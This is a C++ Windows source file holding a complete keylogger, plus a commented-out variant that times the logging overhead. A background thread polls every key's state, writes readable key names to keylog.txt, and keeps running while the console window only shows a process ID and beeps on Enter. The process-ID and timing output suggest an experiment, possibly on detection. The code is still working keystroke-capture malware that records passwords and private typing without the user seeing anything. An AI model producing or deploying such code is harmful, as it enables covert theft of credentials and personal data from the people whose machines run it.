#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <atomic>
#include <map>

std::atomic<bool> keepLogging(true);

// Track key state to prevent multiple logs per press
std::map<int, bool> keyState;

// Converts virtual key codes to readable characters
std::string GetKeyName(int vkCode) {
	char name[128];
	if (GetKeyNameTextA(MapVirtualKeyA(vkCode, 0) << 16, name, 128) > 0) {
		return std::string(name);
	}
	return "[" + std::to_string(vkCode) + "]";
}

void KeyLoggerThread()
{
	std::ofstream logFile("keylog.txt", std::ios::app);
	if (!logFile.is_open()) {
		std::cerr << "[!] Failed to open keylog.txt for writing.\n";
		return;
	}

	while (keepLogging)
	{
		for (int vkCode = 8; vkCode <= 255; ++vkCode)
		{
			SHORT keyStateFlag = GetAsyncKeyState(vkCode);

			// Check if key is pressed and wasn't already recorded
			if ((keyStateFlag & 0x8000) && !::keyState[vkCode])
			{
				::keyState[vkCode] = true;

				std::string keyName = GetKeyName(vkCode);
				logFile << keyName << " ";
				logFile.flush();
			}
			else if (!(keyStateFlag & 0x8000))
			{
				::keyState[vkCode] = false;
			}
		}

		Sleep(10); // 10ms interval
	}

	logFile.close();
}

int main()
{
	// Launch keylogger in a separate thread
	std::thread keyThread(KeyLoggerThread);

	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);
	}

	keepLogging = false;
	keyThread.join();

	return 0;
}

/*
#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <atomic>
#include <map>
#include <chrono>

std::atomic<bool> keepLogging(true);
std::map<int, bool> keyState;

// Converts virtual key codes to readable characters
std::string GetKeyName(int vkCode) {
	char name[128];
	if (GetKeyNameTextA(MapVirtualKeyA(vkCode, 0) << 16, name, 128) > 0) {
		return std::string(name);
	}
	return "[" + std::to_string(vkCode) + "]";
}

void KeyLoggerThread()
{
	std::ofstream logFile("keylog.txt", std::ios::app);
	if (!logFile.is_open()) {
		std::cerr << "[!] Failed to open keylog.txt for writing.\n";
		return;
	}

	while (keepLogging)
	{
		for (int vkCode = 8; vkCode <= 255; ++vkCode)
		{
			SHORT keyStateFlag = GetAsyncKeyState(vkCode);

			// If key is pressed and wasn't recorded
			if ((keyStateFlag & 0x8000) && !::keyState[vkCode])
			{
				::keyState[vkCode] = true;

				// Start time
				auto start = std::chrono::high_resolution_clock::now();

				std::string keyName = GetKeyName(vkCode);
				logFile << keyName << " ";
				logFile.flush();

				// End time and overhead calculation
				auto end = std::chrono::high_resolution_clock::now();
				std::chrono::duration<double, std::micro> overhead = end - start;

				std::cout << "[Key: " << keyName << "] Overhead: "
					<< overhead.count() << " microseconds\n";
			}
			else if (!(keyStateFlag & 0x8000))
			{
				::keyState[vkCode] = false;
			}
		}

		Sleep(10); // Avoid 100% CPU usage
	}

	logFile.close();
}

int main()
{
	// Launch keylogger in a separate thread
	std::thread keyThread(KeyLoggerThread);

	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);
	}

	// Not reached unless break added manually or signal triggers graceful shutdown
	keepLogging = false;
	keyThread.join();

	return 0;
}
*/
